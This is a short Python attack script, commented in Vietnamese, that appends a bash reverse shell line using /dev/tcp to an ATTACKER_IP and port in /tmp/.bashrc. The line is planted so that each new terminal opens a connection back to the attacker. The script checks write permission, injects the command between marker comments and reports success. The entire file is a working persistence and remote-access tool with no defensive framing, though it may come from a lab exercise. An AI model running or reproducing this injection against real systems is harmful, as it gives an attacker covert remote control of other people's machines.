import os

# --- THÔNG SỐ CẦN THAY ĐỔI ---
# ĐỊA CHỈ IP và CỔNG CỦA MÁY ATTACKER (Server lắng nghe)
ATTACKER_IP = "127.0.0.1"  # Thay thế bằng IP thực tế
ATTACKER_PORT = 9001            # Thay thế bằng cổng lắng nghe thực tế
# -----------------------------

# Đường dẫn tệp mục tiêu
TARGET_FILE = "/tmp/.bashrc"

# Lệnh Reverse Shell (Bash)
# Lệnh này sẽ được chạy mỗi khi người dùng mở một terminal mới
REVERSE_SHELL_COMMAND = f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"

def inject_reverse_shell():
    """
    Kiểm tra sự tồn tại của /tmp/.bashrc và chèn lệnh reverse shell.
    """
    print(f"[*] Đang kiểm tra tệp: {TARGET_FILE}")

    # 1. Kiểm tra sự tồn tại của tệp
    if os.path.exists(TARGET_FILE):
        print(f"[+] Tệp tồn tại: {TARGET_FILE}")
        # 2. Kiểm tra xem user có quyền ghi vào tệp không
        if os.access(TARGET_FILE, os.W_OK):
            print("[+] Có quyền ghi (Writable). Tiến hành chèn lệnh...")
            try:
                # 3. Mở tệp ở chế độ 'a' (append) để thêm vào cuối
                with open(TARGET_FILE, 'a') as f:
                    # Thêm ký tự xuống dòng trước lệnh (đảm bảo lệnh mới bắt đầu trên dòng mới)
                    f.write("\n\n# START INJECTED REVERSE SHELL\n")
                    f.write(REVERSE_SHELL_COMMAND)
                    f.write("\n# END INJECTED REVERSE SHELL\n")
                print(" CHÈN THÀNH CÔNG!")
                print(f"   Lệnh đã được chèn: {REVERSE_SHELL_COMMAND}")
                print("\n[!] Lệnh Reverse Shell sẽ được kích hoạt khi user khởi động shell mới.")
            except Exception as e:
                print(f"[-] LỖI: Không thể ghi vào tệp: {e}")
        else:
            print("[-] KHÔNG có quyền ghi (Writable) vào tệp. Không thể chèn lệnh.")
    else:
        print(f"[-] Tệp KHÔNG tồn tại: {TARGET_FILE}")

if __name__ == '__main__':
    inject_reverse_shell()
